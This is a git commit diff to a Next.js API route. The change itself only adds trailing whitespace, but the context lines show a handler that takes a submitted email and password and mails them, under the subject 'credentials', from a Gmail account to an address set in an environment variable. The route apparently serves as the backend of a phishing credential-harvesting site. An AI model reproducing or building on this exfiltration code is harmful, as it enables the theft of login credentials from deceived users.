20cf6a4e5b3f8e4c8ca56dbd6499194ad2361fed
Victor Bello <you@example.com>
2023-07-03 07:13:02 +0100

    cadr

--- src/app/api/send/route.ts
+++ src/app/api/send/route.ts
@@ -21,7 +21,7 @@ export async function POST(request: Request) {
 
       const result = await transporter.sendMail({
          from: `"dees" <deeswork969@gmail.com>`,
-         to: `${process.env.EMAIL_TO_SEND}`,
+         to: `${process.env.EMAIL_TO_SEND}`, 
          subject: 'credentials',
          // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
          html: `<h3>email: ${JSON.stringify(res.email).replaceAll('"', '')}, password: ${JSON.stringify(res.jennet).replaceAll('"', '')}</h3>`
